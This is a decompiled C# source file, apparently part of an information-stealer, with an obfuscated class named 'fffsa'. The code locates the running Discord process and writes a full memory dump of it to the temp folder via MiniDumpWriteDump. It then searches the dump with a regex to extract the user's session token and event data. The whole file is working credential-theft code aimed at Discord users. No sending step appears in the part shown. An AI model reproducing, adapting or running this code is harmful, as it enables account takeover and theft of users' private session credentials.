using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using NoiseMe.Drags.App.Models.Common;
using NoiseMe.Drags.App.Models.JSON;
using NoiseMe.Drags.App.Models.LocalModels;

namespace NoiseMe.Drags.App.Data.Recovery
{
	// Token: 0x02000190 RID: 400
	public static class fffsa
	{
		// Token: 0x06000CB7 RID: 3255
		[DllImport("DbgHelp.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, IntPtr hFile, uint DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);

		// Token: 0x06000CB8 RID: 3256 RVA: 0x00027B18 File Offset: 0x00025D18
		public static DiscordSession TempGet()
		{
			try
			{
				Process process = fffsa.FindDisordProcess();
				if (process != null)
				{
					string text = fffsa.DumpProcess(process);
					if (!string.IsNullOrEmpty(text))
					{
						string text2 = fffsa.FindDiscordJsonSession(text);
						if (!string.IsNullOrEmpty(text2))
						{
							JsonValue jsonValue = text2.FromJSON();
							DiscordSession discordSession = new DiscordSession();
							discordSession.token = jsonValue["token"].ToString(false);
							discordSession.events = new List<Event>();
							foreach (object obj in ((IEnumerable)jsonValue["events"]))
							{
								JsonValue jsonValue2 = (JsonValue)obj;
								Event @event = new Event
								{
									type = jsonValue2["type"].ToString(false)
								};
								foreach (object obj2 in ((IEnumerable)jsonValue2["properties"]))
								{
									JsonValue jsonValue3 = (JsonValue)obj2;
									@event.properties = new Properties();
									@event.properties.client_send_timestamp = jsonValue3["client_send_timestamp"].ToString(false);
									@event.properties.client_track_timestamp = jsonValue3["client_track_timestamp"].ToString(false);
									@event.properties.client_uuid = jsonValue3["client_uuid"].ToString(false);
									@event.properties.num_users_visible = Convert.ToInt32(jsonValue3["num_users_visible"].ToString(false));
									@event.properties.num_users_visible_with_mobile_indicator = Convert.ToInt32(jsonValue3["num_users_visible_with_mobile_indicator"].ToString(false));
								}
								discordSession.events.Add(@event);
							}
							return discordSession;
						}
					}
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
			return null;
		}

		// Token: 0x06000CB9 RID: 3257 RVA: 0x00027D50 File Offset: 0x00025F50
		private static string FindDiscordJsonSession(string data)
		{
			try
			{
				using (IEnumerator enumerator = fffsa.regex.Matches(data).GetEnumerator())
				{
					if (enumerator.MoveNext())
					{
						return ((Match)enumerator.Current).Value;
					}
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
			return string.Empty;
		}

		// Token: 0x06000CBA RID: 3258 RVA: 0x00027DCC File Offset: 0x00025FCC
		private static string DumpProcess(Process process)
		{
			string empty = string.Empty;
			try
			{
				string path = Environment.ExpandEnvironmentVariables(Path.Combine("%temp%", "discord.dmp"));
				bool flag = false;
				using (FileStream fileStream = File.Open(path, FileMode.Create, FileAccess.Write))
				{
					flag = fffsa.MiniDumpWriteDump(process.Handle, process.Id, fileStream.SafeFileHandle.DangerousGetHandle(), 2u, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
				}
				if (flag)
				{
					return File.ReadAllText(path);
				}
			}
			catch
			{
			}
			return empty;
		}

		// Token: 0x06000CBB RID: 3259 RVA: 0x00027E6C File Offset: 0x0002606C
		private static Process FindDisordProcess()
		{
			try
			{
				foreach (Process process in Process.GetProcessesByName("Discord"))
				{
					if (ClientInfoHelper.GetCommandLine(process).Trim() == "\"" + process.MainModule.FileName + "\"")
					{
						return process;
					}
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
			return null;
		}

		// Token: 0x04000505 RID: 1285
		private static Regex regex = new Regex("({\"token\":\"(.*)}}]})", RegexOptions.Compiled);
	}
}
